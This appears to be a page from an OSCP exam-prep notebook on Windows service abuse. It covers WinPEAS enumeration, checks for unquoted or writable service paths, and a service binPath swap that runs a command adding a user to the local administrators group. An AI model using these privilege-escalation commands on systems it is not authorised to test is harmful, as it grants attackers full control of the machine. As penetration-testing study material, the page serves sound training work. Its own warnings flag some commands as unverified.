# Windows - Service Abuse

**Step 30 of 50 · Windows**

*Use local enumeration to find writable services or unquoted service paths.*

## Run this

> **Why:** This command gathers the windows service abuse evidence needed to decide which documented route applies next.
```powershell
winpeas.exe
sc qc $ServiceName
Get-Acl $ServicePath
```

## Example output

 > *Example shape only: the WinPEAS and Get-Acl commands are not yet verified against a real box.*
```
Unquoted Service Path: Example Service
Binary Path: C:\Program Files\Example App\service.exe
Writable by: Users
...
```
## What did you get?

- [ ] A writable service binary is found → **Run `sc.exe qc $ServiceName`, replace the binary at the displayed path, run `sc.exe start $ServiceName`, and restore the original file**
- [ ] An unquoted service path is found → **Run `sc.exe qc $ServiceName`, place the authorized test executable at the first writable path boundary, restart the service, and then remove it**
- [ ] No useful service is found → **Go to Step 32 · [[Windows - Credential Search]]**

## Notes

Run WinPEAS from a controlled local transfer and save only the useful findings.

**Server Operators, binary path swap**

> **Why:** This command gathers the windows service abuse evidence needed to decide which documented route applies next.
```cmd
sc.exe config $ServiceName binPath= "cmd.exe /c net localgroup administrators $Username /add"
sc.exe start $ServiceName
sc.exe config $ServiceName binPath= "$ServicePath"
sc.exe qc $ServiceName
net localgroup administrators
```

Error 1053 is expected when the replacement is not a proper service binary. The command can still execute before the timeout. Restore the original path immediately, then start a new logon session before expecting the group membership to appear in the token.

## Gotcha

> [!warning] 💡
> The exact service-abuse command depends on the service configuration and was not directly tested in MarkUp.

> [!warning]
> Command not yet verified against a real box. Confirm the exact WinPEAS invocation and `Get-Acl` syntax before relying on this in an exam.

## External Resources

- [HackTricks, Windows Local Privilege Escalation](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [Microsoft, sc.exe config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config)
## Seen in
- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- confirmed in the box write-up

## Related stages

- [[Windows - Service Scan]]
- [[Windows - Web Enum]]
- [[Windows - SMB Enum]]
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
